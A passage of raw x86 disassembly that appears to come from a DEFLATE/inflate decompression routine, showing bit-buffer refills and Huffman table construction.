  405e23:	74 48                	je     0x405e6d
  405e25:	48                   	dec    %eax
  405e26:	0f 85 5d 09 00 00    	jne    0x406789
  405e2c:	83 cf ff             	or     $0xffffffff,%edi
  405e2f:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  405e35:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405e38:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405e3b:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  405e41:	8b 45 cc             	mov    -0x34(%ebp),%eax
  405e44:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  405e4a:	89 41 04             	mov    %eax,0x4(%ecx)
  405e4d:	8b 45 08             	mov    0x8(%ebp),%eax
  405e50:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  405e53:	50                   	push   %eax
  405e54:	89 08                	mov    %ecx,(%eax)
  405e56:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e59:	89 8e a8 9b 00 00    	mov    %ecx,0x9ba8(%esi)
  405e5f:	e8 a0 09 00 00       	call   0x406804
  405e64:	8b c7                	mov    %edi,%eax
  405e66:	5f                   	pop    %edi
  405e67:	5e                   	pop    %esi
  405e68:	5b                   	pop    %ebx
  405e69:	c9                   	leave
  405e6a:	c2 04 00             	ret    $0x4
  405e6d:	c7 06 0b 00 00 00    	movl   $0xb,(%esi)
  405e73:	e9 11 09 00 00       	jmp    0x406789
  405e78:	80 3d a0 df 42 00 00 	cmpb   $0x0,0x42dfa0
  405e7f:	0f 85 a0 00 00 00    	jne    0x405f25
  405e85:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  405e89:	b8 20 ce 42 00       	mov    $0x42ce20,%eax
  405e8e:	3d 5c d0 42 00       	cmp    $0x42d05c,%eax
  405e93:	b1 08                	mov    $0x8,%cl
  405e95:	7e 14                	jle    0x405eab
  405e97:	3d 20 d2 42 00       	cmp    $0x42d220,%eax
  405e9c:	7d 04                	jge    0x405ea2
  405e9e:	fe c1                	inc    %cl
  405ea0:	eb 09                	jmp    0x405eab
  405ea2:	3d 80 d2 42 00       	cmp    $0x42d280,%eax
  405ea7:	7d 02                	jge    0x405eab
  405ea9:	b1 07                	mov    $0x7,%cl
  405eab:	0f be c9             	movsbl %cl,%ecx
  405eae:	89 08                	mov    %ecx,(%eax)
  405eb0:	83 c0 04             	add    $0x4,%eax
  405eb3:	3d a0 d2 42 00       	cmp    $0x42d2a0,%eax
  405eb8:	7c d4                	jl     0x405e8e
  405eba:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405ebd:	bf 20 ce 42 00       	mov    $0x42ce20,%edi
  405ec2:	50                   	push   %eax
  405ec3:	68 20 d7 42 00       	push   $0x42d720
  405ec8:	68 d4 93 40 00       	push   $0x4093d4
  405ecd:	68 1c ce 42 00       	push   $0x42ce1c
  405ed2:	68 60 73 40 00       	push   $0x407360
  405ed7:	68 20 73 40 00       	push   $0x407320
  405edc:	68 01 01 00 00       	push   $0x101
  405ee1:	68 20 01 00 00       	push   $0x120
  405ee6:	57                   	push   %edi
  405ee7:	e8 80 09 00 00       	call   0x40686c
  405eec:	6a 1e                	push   $0x1e
  405eee:	59                   	pop    %ecx
  405eef:	6a 05                	push   $0x5
  405ef1:	58                   	pop    %eax
  405ef2:	f3 ab                	rep stos %eax,%es:(%edi)
  405ef4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405ef7:	50                   	push   %eax
  405ef8:	68 20 d7 42 00       	push   $0x42d720
  405efd:	68 d8 93 40 00       	push   $0x4093d8
  405f02:	68 18 ce 42 00       	push   $0x42ce18
  405f07:	68 dc 73 40 00       	push   $0x4073dc
  405f0c:	68 a0 73 40 00       	push   $0x4073a0
  405f11:	6a 00                	push   $0x0
  405f13:	6a 1e                	push   $0x1e
  405f15:	68 20 ce 42 00       	push   $0x42ce20
  405f1a:	e8 4d 09 00 00       	call   0x40686c
  405f1f:	fe 05 a0 df 42 00    	incb   0x42dfa0
  405f25:	a0 d4 93 40 00       	mov    0x4093d4,%al
  405f2a:	88 46 10             	mov    %al,0x10(%esi)
  405f2d:	a0 d8 93 40 00       	mov    0x4093d8,%al
  405f32:	88 46 11             	mov    %al,0x11(%esi)
  405f35:	a1 1c ce 42 00       	mov    0x42ce1c,%eax
  405f3a:	89 46 14             	mov    %eax,0x14(%esi)
  405f3d:	a1 18 ce 42 00       	mov    0x42ce18,%eax
  405f42:	89 46 18             	mov    %eax,0x18(%esi)
  405f45:	83 26 00             	andl   $0x0,(%esi)
  405f48:	e9 3c 08 00 00       	jmp    0x406789
  405f4d:	8b cb                	mov    %ebx,%ecx
  405f4f:	c7 06 09 00 00 00    	movl   $0x9,(%esi)
  405f55:	83 e1 07             	and    $0x7,%ecx
  405f58:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  405f5b:	2b d9                	sub    %ecx,%ebx
  405f5d:	e9 27 08 00 00       	jmp    0x406789
  405f62:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  405f66:	0f 84 2d 08 00 00    	je     0x406799
  405f6c:	8b 45 c8             	mov    -0x38(%ebp),%eax
  405f6f:	ff 4d cc             	decl   -0x34(%ebp)
  405f72:	8b cb                	mov    %ebx,%ecx
  405f74:	0f b6 00             	movzbl (%eax),%eax
  405f77:	d3 e0                	shl    %cl,%eax
  405f79:	09 45 c0             	or     %eax,-0x40(%ebp)
  405f7c:	ff 45 c8             	incl   -0x38(%ebp)
  405f7f:	83 c3 08             	add    $0x8,%ebx
  405f82:	83 fb 10             	cmp    $0x10,%ebx
  405f85:	72 db                	jb     0x405f62
  405f87:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405f8a:	33 db                	xor    %ebx,%ebx
  405f8c:	25 ff ff 00 00       	and    $0xffff,%eax
  405f91:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  405f94:	3b c3                	cmp    %ebx,%eax
  405f96:	89 46 04             	mov    %eax,0x4(%esi)
  405f99:	0f 84 e9 00 00 00    	je     0x406088
  405f9f:	6a 0a                	push   $0xa
  405fa1:	58                   	pop    %eax
  405fa2:	e9 e7 00 00 00       	jmp    0x40608e
  405fa7:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  405fab:	0f 84 e8 07 00 00    	je     0x406799
  405fb1:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405fb4:	85 c0                	test   %eax,%eax
  405fb6:	0f 85 98 00 00 00    	jne    0x406054
  405fbc:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  405fc2:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405fc5:	3b d1                	cmp    %ecx,%edx
  405fc7:	75 29                	jne    0x405ff2
  405fc9:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  405fcf:	8d be a0 1b 00 00    	lea    0x1ba0(%esi),%edi
  405fd5:	3b c7                	cmp    %edi,%eax
  405fd7:	74 19                	je     0x405ff2
  405fd9:	8b d7                	mov    %edi,%edx
  405fdb:	3b d0                	cmp    %eax,%edx
  405fdd:	89 55 d0             	mov    %edx,-0x30(%ebp)
  405fe0:	73 05                	jae    0x405fe7
  405fe2:	2b c2                	sub    %edx,%eax
  405fe4:	48                   	dec    %eax
  405fe5:	eb 04                	jmp    0x405feb
  405fe7:	2b ca                	sub    %edx,%ecx
  405fe9:	8b c1                	mov    %ecx,%eax
  405feb:	85 c0                	test   %eax,%eax
  405fed:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405ff0:	75 62                	jne    0x406054
  405ff2:	ff 75 08             	push   0x8(%ebp)
  405ff5:	89 96 a8 9b 00 00    	mov    %edx,0x9ba8(%esi)
  405ffb:	e8 04 08 00 00       	call   0x406804
  406000:	8b 96 a8 9b 00 00    	mov    0x9ba8(%esi),%edx
  406006:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  40600c:	3b d1                	cmp    %ecx,%edx
  40600e:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406011:	73 07                	jae    0x40601a
  406013:	8b c1                	mov    %ecx,%eax
  406015:	2b c2                	sub    %edx,%eax
  406017:	48                   	dec    %eax
  406018:	eb 08                	jmp    0x406022
  40601a:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406020:	2b c2                	sub    %edx,%eax
  406022:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  406028:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40602b:	3b d7                	cmp    %edi,%edx
  40602d:	75 1d                	jne    0x40604c
  40602f:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  406035:	3b d1                	cmp    %ecx,%edx
  406037:	74 13                	je     0x40604c
  406039:	89 55 d0             	mov    %edx,-0x30(%ebp)
  40603c:	73 07                	jae    0x406045
  40603e:	2b ca                	sub    %edx,%ecx
  406040:	49                   	dec    %ecx
  406041:	8b c1                	mov    %ecx,%eax
  406043:	eb 04                	jmp    0x406049
  406045:	2b fa                	sub    %edx,%edi
  406047:	8b c7                	mov    %edi,%eax
  406049:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40604c:	85 c0                	test   %eax,%eax
  40604e:	0f 84 61 07 00 00    	je     0x4067b5
  406054:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  406057:	72 03                	jb     0x40605c
  406059:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40605c:	8b 4e 04             	mov    0x4(%esi),%ecx
  40605f:	3b c8                	cmp    %eax,%ecx
  406061:	8b f9                	mov    %ecx,%edi
  406063:	72 02                	jb     0x406067
  406065:	8b f8                	mov    %eax,%edi
  406067:	57                   	push   %edi
  406068:	ff 75 c8             	push   -0x38(%ebp)
  40606b:	ff 75 d0             	push   -0x30(%ebp)
  40606e:	e8 ce f5 ff ff       	call   0x405641
  406073:	01 7d c8             	add    %edi,-0x38(%ebp)
  406076:	29 7d cc             	sub    %edi,-0x34(%ebp)
  406079:	01 7d d0             	add    %edi,-0x30(%ebp)
  40607c:	29 7d d4             	sub    %edi,-0x2c(%ebp)
  40607f:	29 7e 04             	sub    %edi,0x4(%esi)
  406082:	0f 85 01 07 00 00    	jne    0x406789
  406088:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  40608e:	89 06                	mov    %eax,(%esi)
  406090:	e9 f4 06 00 00       	jmp    0x406789
  406095:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406099:	0f 84 fa 06 00 00    	je     0x406799
  40609f:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4060a2:	ff 4d cc             	decl   -0x34(%ebp)
  4060a5:	8b cb                	mov    %ebx,%ecx
  4060a7:	0f b6 00             	movzbl (%eax),%eax
  4060aa:	d3 e0                	shl    %cl,%eax
  4060ac:	09 45 c0             	or     %eax,-0x40(%ebp)
  4060af:	ff 45 c8             	incl   -0x38(%ebp)
  4060b2:	83 c3 08             	add    $0x8,%ebx
  4060b5:	83 fb 0e             	cmp    $0xe,%ebx
  4060b8:	72 db                	jb     0x406095
  4060ba:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4060bd:	25 ff 3f 00 00       	and    $0x3fff,%eax
  4060c2:	8b c8                	mov    %eax,%ecx
  4060c4:	89 46 04             	mov    %eax,0x4(%esi)
  4060c7:	83 e1 1f             	and    $0x1f,%ecx
  4060ca:	80 f9 1d             	cmp    $0x1d,%cl
  4060cd:	0f 87 59 fd ff ff    	ja     0x405e2c
  4060d3:	25 e0 03 00 00       	and    $0x3e0,%eax
  4060d8:	3d a0 03 00 00       	cmp    $0x3a0,%eax
  4060dd:	0f 87 49 fd ff ff    	ja     0x405e2c
  4060e3:	c1 6d c0 0e          	shrl   $0xe,-0x40(%ebp)
  4060e7:	83 eb 0e             	sub    $0xe,%ebx
  4060ea:	83 66 08 00          	andl   $0x0,0x8(%esi)
  4060ee:	c7 06 0c 00 00 00    	movl   $0xc,(%esi)
  4060f4:	8b 46 04             	mov    0x4(%esi),%eax
  4060f7:	c1 e8 0a             	shr    $0xa,%eax
  4060fa:	83 c0 04             	add    $0x4,%eax
  4060fd:	39 46 08             	cmp    %eax,0x8(%esi)
  406100:	73 69                	jae    0x40616b
  406102:	eb 20                	jmp    0x406124
  406104:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406108:	0f 84 8b 06 00 00    	je     0x406799
  40610e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406111:	ff 4d cc             	decl   -0x34(%ebp)
  406114:	8b cb                	mov    %ebx,%ecx
  406116:	0f b6 00             	movzbl (%eax),%eax
  406119:	d3 e0                	shl    %cl,%eax
  40611b:	09 45 c0             	or     %eax,-0x40(%ebp)
  40611e:	ff 45 c8             	incl   -0x38(%ebp)
  406121:	83 c3 08             	add    $0x8,%ebx
  406124:	83 fb 03             	cmp    $0x3,%ebx
  406127:	72 db                	jb     0x406104
  406129:	8b 4e 08             	mov    0x8(%esi),%ecx
  40612c:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40612f:	83 e0 07             	and    $0x7,%eax
  406132:	83 eb 03             	sub    $0x3,%ebx
  406135:	0f be 89 0c 73 40 00 	movsbl 0x40730c(%ecx),%ecx
  40613c:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  406140:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406144:	8b 4e 04             	mov    0x4(%esi),%ecx
  406147:	ff 46 08             	incl   0x8(%esi)
  40614a:	8b 46 08             	mov    0x8(%esi),%eax
  40614d:	c1 e9 0a             	shr    $0xa,%ecx
  406150:	83 c1 04             	add    $0x4,%ecx
  406153:	3b c1                	cmp    %ecx,%eax
  406155:	72 cd                	jb     0x406124
  406157:	eb 12                	jmp    0x40616b
  406159:	8b 46 08             	mov    0x8(%esi),%eax
  40615c:	0f be 80 0c 73 40 00 	movsbl 0x40730c(%eax),%eax
  406163:	83 64 86 0c 00       	andl   $0x0,0xc(%esi,%eax,4)
  406168:	ff 46 08             	incl   0x8(%esi)
  40616b:	83 7e 08 13          	cmpl   $0x13,0x8(%esi)
  40616f:	72 e8                	jb     0x406159
  406171:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406174:	8d be 0c 05 00 00    	lea    0x50c(%esi),%edi
  40617a:	51                   	push   %ecx
  40617b:	8d 8e 20 05 00 00    	lea    0x520(%esi),%ecx
  406181:	51                   	push   %ecx
  406182:	8d 8e 10 05 00 00    	lea    0x510(%esi),%ecx
  406188:	33 c0                	xor    %eax,%eax
  40618a:	57                   	push   %edi
  40618b:	51                   	push   %ecx
  40618c:	50                   	push   %eax
  40618d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406190:	50                   	push   %eax
  406191:	6a 13                	push   $0x13
  406193:	8d 46 0c             	lea    0xc(%esi),%eax
  406196:	6a 13                	push   $0x13
  406198:	50                   	push   %eax
  406199:	c7 07 07 00 00 00    	movl   $0x7,(%edi)
  40619f:	e8 c8 06 00 00       	call   0x40686c
  4061a4:	85 c0                	test   %eax,%eax
  4061a6:	75 12                	jne    0x4061ba
  4061a8:	39 07                	cmp    %eax,(%edi)
  4061aa:	74 0e                	je     0x4061ba
  4061ac:	21 46 08             	and    %eax,0x8(%esi)
  4061af:	c7 06 0d 00 00 00    	movl   $0xd,(%esi)
  4061b5:	e9 1d 01 00 00       	jmp    0x4062d7
  4061ba:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  4061c0:	e9 c4 05 00 00       	jmp    0x406789
  4061c5:	8b 86 0c 05 00 00    	mov    0x50c(%esi),%eax
  4061cb:	eb 20                	jmp    0x4061ed
  4061cd:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4061d1:	0f 84 c2 05 00 00    	je     0x406799
  4061d7:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4061da:	ff 4d cc             	decl   -0x34(%ebp)
  4061dd:	0f b6 11             	movzbl (%ecx),%edx
  4061e0:	8b cb                	mov    %ebx,%ecx
  4061e2:	d3 e2                	shl    %cl,%edx
  4061e4:	09 55 c0             	or     %edx,-0x40(%ebp)
  4061e7:	ff 45 c8             	incl   -0x38(%ebp)
  4061ea:	83 c3 08             	add    $0x8,%ebx
  4061ed:	3b d8                	cmp    %eax,%ebx
  4061ef:	72 dc                	jb     0x4061cd
  4061f1:	0f b7 04 45 b0 93 40 	movzwl 0x4093b0(,%eax,2),%eax
  4061f8:	00 
  4061f9:	23 45 c0             	and    -0x40(%ebp),%eax
  4061fc:	8b 8e 10 05 00 00    	mov    0x510(%esi),%ecx
  406202:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406205:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406209:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  40620d:	83 f8 10             	cmp    $0x10,%eax
  406210:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406213:	73 16                	jae    0x40622b
  406215:	8b ca                	mov    %edx,%ecx
  406217:	2b da                	sub    %edx,%ebx
  406219:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  40621c:	8b 4e 08             	mov    0x8(%esi),%ecx
  40621f:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406223:	ff 46 08             	incl   0x8(%esi)
  406226:	e9 ac 00 00 00       	jmp    0x4062d7
  40622b:	83 f8 12             	cmp    $0x12,%eax
  40622e:	75 0c                	jne    0x40623c
  406230:	6a 07                	push   $0x7
  406232:	c7 45 f8 0b 00 00 00 	movl   $0xb,-0x8(%ebp)
  406239:	58                   	pop    %eax
  40623a:	eb 2c                	jmp    0x406268
  40623c:	83 c0 f2             	add    $0xfffffff2,%eax
  40623f:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%ebp)
  406246:	eb 20                	jmp    0x406268
  406248:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40624c:	0f 84 47 05 00 00    	je     0x406799
  406252:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406255:	ff 4d cc             	decl   -0x34(%ebp)
  406258:	0f b6 39             	movzbl (%ecx),%edi
  40625b:	8b cb                	mov    %ebx,%ecx
  40625d:	d3 e7                	shl    %cl,%edi
  40625f:	09 7d c0             	or     %edi,-0x40(%ebp)
  406262:	ff 45 c8             	incl   -0x38(%ebp)
  406265:	83 c3 08             	add    $0x8,%ebx
  406268:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  40626b:	3b d9                	cmp    %ecx,%ebx
  40626d:	72 d9                	jb     0x406248
  40626f:	8b ca                	mov    %edx,%ecx
  406271:	2b da                	sub    %edx,%ebx
  406273:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406276:	0f b7 0c 45 b0 93 40 	movzwl 0x4093b0(,%eax,2),%ecx
  40627d:	00 
  40627e:	23 4d c0             	and    -0x40(%ebp),%ecx
  406281:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406284:	2b d8                	sub    %eax,%ebx
  406286:	03 d1                	add    %ecx,%edx
  406288:	8b c8                	mov    %eax,%ecx
  40628a:	8b 46 04             	mov    0x4(%esi),%eax
  40628d:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406290:	8b 4e 08             	mov    0x8(%esi),%ecx
  406293:	8b f8                	mov    %eax,%edi
  406295:	c1 ef 05             	shr    $0x5,%edi
  406298:	83 e7 1f             	and    $0x1f,%edi
  40629b:	83 e0 1f             	and    $0x1f,%eax
  40629e:	8d 84 07 02 01 00 00 	lea    0x102(%edi,%eax,1),%eax
  4062a5:	8d 3c 0a             	lea    (%edx,%ecx,1),%edi
  4062a8:	3b f8                	cmp    %eax,%edi
  4062aa:	0f 87 7c fb ff ff    	ja     0x405e2c
  4062b0:	83 7d ec 10          	cmpl   $0x10,-0x14(%ebp)
  4062b4:	75 0f                	jne    0x4062c5
  4062b6:	83 f9 01             	cmp    $0x1,%ecx
  4062b9:	0f 82 6d fb ff ff    	jb     0x405e2c
  4062bf:	8b 7c 8e 08          	mov    0x8(%esi,%ecx,4),%edi
  4062c3:	eb 02                	jmp    0x4062c7
  4062c5:	33 ff                	xor    %edi,%edi
  4062c7:	8d 44 8e 0c          	lea    0xc(%esi,%ecx,4),%eax
  4062cb:	89 38                	mov    %edi,(%eax)
  4062cd:	41                   	inc    %ecx
  4062ce:	83 c0 04             	add    $0x4,%eax
  4062d1:	4a                   	dec    %edx
  4062d2:	75 f7                	jne    0x4062cb
  4062d4:	89 4e 08             	mov    %ecx,0x8(%esi)
  4062d7:	8b 46 04             	mov    0x4(%esi),%eax
  4062da:	8b 4e 08             	mov    0x8(%esi),%ecx
  4062dd:	8b d0                	mov    %eax,%edx
  4062df:	83 e0 1f             	and    $0x1f,%eax
  4062e2:	c1 ea 05             	shr    $0x5,%edx
  4062e5:	83 e2 1f             	and    $0x1f,%edx
  4062e8:	8d 84 02 02 01 00 00 	lea    0x102(%edx,%eax,1),%eax
  4062ef:	3b c8                	cmp    %eax,%ecx
  4062f1:	0f 82 ce fe ff ff    	jb     0x4061c5
  4062f7:	8b 46 04             	mov    0x4(%esi),%eax
  4062fa:	83 a6 10 05 00 00 00 	andl   $0x0,0x510(%esi)
  406301:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  406305:	8b f8                	mov    %eax,%edi
  406307:	c1 e8 05             	shr    $0x5,%eax
  40630a:	83 e7 1f             	and    $0x1f,%edi
  40630d:	b9 01 01 00 00       	mov    $0x101,%ecx
  406312:	83 e0 1f             	and    $0x1f,%eax
  406315:	03 f9                	add    %ecx,%edi
  406317:	40                   	inc    %eax
  406318:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40631b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40631e:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  406324:	52                   	push   %edx
  406325:	50                   	push   %eax
  406326:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406329:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  406330:	50                   	push   %eax
  406331:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406334:	50                   	push   %eax
  406335:	68 60 73 40 00       	push   $0x407360
  40633a:	68 20 73 40 00       	push   $0x407320
  40633f:	51                   	push   %ecx
  406340:	8d 46 0c             	lea    0xc(%esi),%eax
  406343:	57                   	push   %edi
  406344:	50                   	push   %eax
  406345:	c7 45 f0 06 00 00 00 	movl   $0x6,-0x10(%ebp)
  40634c:	e8 1b 05 00 00       	call   0x40686c
  406351:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406355:	75 03                	jne    0x40635a
  406357:	83 c8 ff             	or     $0xffffffff,%eax
  40635a:	85 c0                	test   %eax,%eax
  40635c:	0f 85 ca fa ff ff    	jne    0x405e2c
  406362:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406365:	50                   	push   %eax
  406366:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  40636c:	50                   	push   %eax
  40636d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406370:	50                   	push   %eax
  406371:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406374:	50                   	push   %eax
  406375:	68 dc 73 40 00       	push   $0x4073dc
  40637a:	68 a0 73 40 00       	push   $0x4073a0
  40637f:	6a 00                	push   $0x0
  406381:	ff 75 ec             	push   -0x14(%ebp)
  406384:	8d 44 be 0c          	lea    0xc(%esi,%edi,4),%eax
  406388:	50                   	push   %eax
  406389:	e8 de 04 00 00       	call   0x40686c
  40638e:	85 c0                	test   %eax,%eax
  406390:	0f 85 96 fa ff ff    	jne    0x405e2c
  406396:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406399:	85 c0                	test   %eax,%eax
  40639b:	75 0c                	jne    0x4063a9
  40639d:	81 ff 01 01 00 00    	cmp    $0x101,%edi
  4063a3:	0f 8f 83 fa ff ff    	jg     0x405e2c
  4063a9:	8a 4d fc             	mov    -0x4(%ebp),%cl
  4063ac:	83 26 00             	andl   $0x0,(%esi)
  4063af:	88 46 11             	mov    %al,0x11(%esi)
  4063b2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4063b5:	89 46 14             	mov    %eax,0x14(%esi)
  4063b8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4063bb:	88 4e 10             	mov    %cl,0x10(%esi)
  4063be:	89 46 18             	mov    %eax,0x18(%esi)
  4063c1:	0f b6 46 10          	movzbl 0x10(%esi),%eax
  4063c5:	89 46 0c             	mov    %eax,0xc(%esi)
  4063c8:	8b 46 14             	mov    0x14(%esi),%eax
  4063cb:	89 46 08             	mov    %eax,0x8(%esi)
  4063ce:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  4063d4:	8b 46 0c             	mov    0xc(%esi),%eax
  4063d7:	eb 20                	jmp    0x4063f9
  4063d9:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4063dd:	0f 84 b6 03 00 00    	je     0x406799
  4063e3:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4063e6:	ff 4d cc             	decl   -0x34(%ebp)
  4063e9:	0f b6 11             	movzbl (%ecx),%edx
  4063ec:	8b cb                	mov    %ebx,%ecx
  4063ee:	d3 e2                	shl    %cl,%edx
  4063f0:	09 55 c0             	or     %edx,-0x40(%ebp)
  4063f3:	ff 45 c8             	incl   -0x38(%ebp)
  4063f6:	83 c3 08             	add    $0x8,%ebx
  4063f9:	3b d8                	cmp    %eax,%ebx
  4063fb:	72 dc                	jb     0x4063d9
  4063fd:	0f b7 04 45 b0 93 40 	movzwl 0x4093b0(,%eax,2),%eax
  406404:	00 
  406405:	23 45 c0             	and    -0x40(%ebp),%eax
  406408:	8b 4e 08             	mov    0x8(%esi),%ecx
  40640b:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40640e:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  406412:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406415:	2b d9                	sub    %ecx,%ebx
  406417:	0f b6 08             	movzbl (%eax),%ecx
  40641a:	85 c9                	test   %ecx,%ecx
  40641c:	75 12                	jne    0x406430
  40641e:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406422:	89 46 08             	mov    %eax,0x8(%esi)
  406425:	c7 06 06 00 00 00    	movl   $0x6,(%esi)
  40642b:	e9 59 03 00 00       	jmp    0x406789
  406430:	f6 c1 10             	test   $0x10,%cl
  406433:	74 18                	je     0x40644d
  406435:	83 e1 0f             	and    $0xf,%ecx
  406438:	89 4e 08             	mov    %ecx,0x8(%esi)
  40643b:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  40643f:	89 46 04             	mov    %eax,0x4(%esi)
  406442:	c7 06 02 00 00 00    	movl   $0x2,(%esi)
  406448:	e9 3c 03 00 00       	jmp    0x406789
  40644d:	f6 c1 40             	test   $0x40,%cl
  406450:	0f 84 d1 00 00 00    	je     0x406527
  406456:	f6 c1 20             	test   $0x20,%cl
  406459:	0f 84 cd f9 ff ff    	je     0x405e2c
  40645f:	c7 06 07 00 00 00    	movl   $0x7,(%esi)
  406465:	e9 1f 03 00 00       	jmp    0x406789
  40646a:	8b 46 08             	mov    0x8(%esi),%eax
  40646d:	eb 20                	jmp    0x40648f
  40646f:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406473:	0f 84 20 03 00 00    	je     0x406799
  406479:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40647c:	ff 4d cc             	decl   -0x34(%ebp)
  40647f:	0f b6 11             	movzbl (%ecx),%edx
  406482:	8b cb                	mov    %ebx,%ecx
  406484:	d3 e2                	shl    %cl,%edx
  406486:	09 55 c0             	or     %edx,-0x40(%ebp)
  406489:	ff 45 c8             	incl   -0x38(%ebp)
  40648c:	83 c3 08             	add    $0x8,%ebx
  40648f:	3b d8                	cmp    %eax,%ebx
  406491:	72 dc                	jb     0x40646f
  406493:	0f b7 0c 45 b0 93 40 	movzwl 0x4093b0(,%eax,2),%ecx
  40649a:	00 
  40649b:	23 4d c0             	and    -0x40(%ebp),%ecx
  40649e:	01 4e 04             	add    %ecx,0x4(%esi)
  4064a1:	8b c8                	mov    %eax,%ecx
  4064a3:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  4064a6:	2b d8                	sub    %eax,%ebx
  4064a8:	0f b6 46 11          	movzbl 0x11(%esi),%eax
  4064ac:	89 46 0c             	mov    %eax,0xc(%esi)
  4064af:	8b 46 18             	mov    0x18(%esi),%eax
  4064b2:	89 46 08             	mov    %eax,0x8(%esi)
  4064b5:	c7 06 03 00 00 00    	movl   $0x3,(%esi)
  4064bb:	8b 46 0c             	mov    0xc(%esi),%eax
  4064be:	eb 20                	jmp    0x4064e0
  4064c0:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4064c4:	0f 84 cf 02 00 00    	je     0x406799
  4064ca:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4064cd:	ff 4d cc             	decl   -0x34(%ebp)
  4064d0:	0f b6 11             	movzbl (%ecx),%edx
  4064d3:	8b cb                	mov    %ebx,%ecx
  4064d5:	d3 e2                	shl    %cl,%edx
  4064d7:	09 55 c0             	or     %edx,-0x40(%ebp)
  4064da:	ff 45 c8             	incl   -0x38(%ebp)
  4064dd:	83 c3 08             	add    $0x8,%ebx
  4064e0:	3b d8                	cmp    %eax,%ebx
  4064e2:	72 dc                	jb     0x4064c0
  4064e4:	0f b7 04 45 b0 93 40 	movzwl 0x4093b0(,%eax,2),%eax
  4064eb:	00 
  4064ec:	23 45 c0             	and    -0x40(%ebp),%eax
  4064ef:	8b 4e 08             	mov    0x8(%esi),%ecx
  4064f2:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4064f5:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4064f9:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  4064fc:	2b d9                	sub    %ecx,%ebx
